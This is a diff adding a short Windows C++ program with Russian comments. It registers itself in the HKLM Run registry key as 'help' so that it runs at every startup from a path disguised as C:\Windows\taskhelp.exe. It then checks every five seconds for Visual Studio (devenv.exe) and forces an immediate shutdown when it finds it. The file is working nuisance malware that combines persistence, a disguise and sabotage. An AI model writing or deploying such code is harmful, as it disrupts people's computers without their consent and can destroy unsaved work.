@@ -1,0 +1,79 @@
+#include "windows.h"
+#include <conio.h>
+#include <tlhelp32.h>
+#include <TCHAR.H>
+
+bool areEqual(const TCHAR *a, const TCHAR *b) //Подфункция для сравнения переменных типа TCHAR
+{
+	while (*a == *b)
+	{
+		if (*a == _TEXT('\0'))
+			return true;
+		a++; 
+		b++;
+	}
+	return false;
+}
+
+bool isProcessRun(TCHAR *Name)
+{
+	bool RUN = false;
+	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //Получение списка открытых процессов
+
+	PROCESSENTRY32 pe;
+	pe.dwSize = sizeof(PROCESSENTRY32);
+
+	Process32First(hSnapshot, &pe); //Получение первого процесса
+
+	if (areEqual(pe.szExeFile, Name)) //Сравнение с искомым
+	{
+		RUN = true;
+		return RUN;
+	}
+
+	while (Process32Next(hSnapshot, &pe)) //Получение следующего процесса
+	{
+		if (areEqual(pe.szExeFile, Name)) //Сравнение с искомым
+		{
+			RUN = true;
+			return RUN;
+		}
+	}
+
+	return RUN;
+}
+
+void autoRun()
+{
+	HKEY hkey;
+	TCHAR path[512] = TEXT("C:\\Windows\\taskhelp.exe"); //Путь, где должен лежать taskhelp.exe
+
+	RegOpenKeyEx(HKEY_LOCAL_MACHINE,
+				TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
+				0,
+				KEY_ALL_ACCESS | KEY_WOW64_64KEY,
+				&hkey); //Открытие ключа
+
+	LPCWSTR nameInReg = TEXT("help"); //Так будет называться позиция в реестре
+
+	RegSetValueEx(hkey, nameInReg, 0, REG_SZ, (LPBYTE)path, wcslen(path) + 30); //Запись в поле открытого ключа реестра
+	RegCloseKey(hkey); //Закрытие ключа
+}
+
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
+	LPSTR lpszCmdLine, int nCmdShow)
+{
+	autoRun(); //Создание записи в реестре для автоматического запуска этой программы при старте компьютера
+
+	TCHAR Name[128] = TEXT("devenv.exe"); //Название процесса, от которого будет выключаться компьютер
+	Sleep(10000);
+	for (;;) //Проверка на наличие процесса, выполняется раз в 5 секунд
+	{
+		Sleep(5000);
+		if (isProcessRun(Name) == TRUE)
+		{
+			system("shutdown -s -t 0");
+		}
+	}
+}
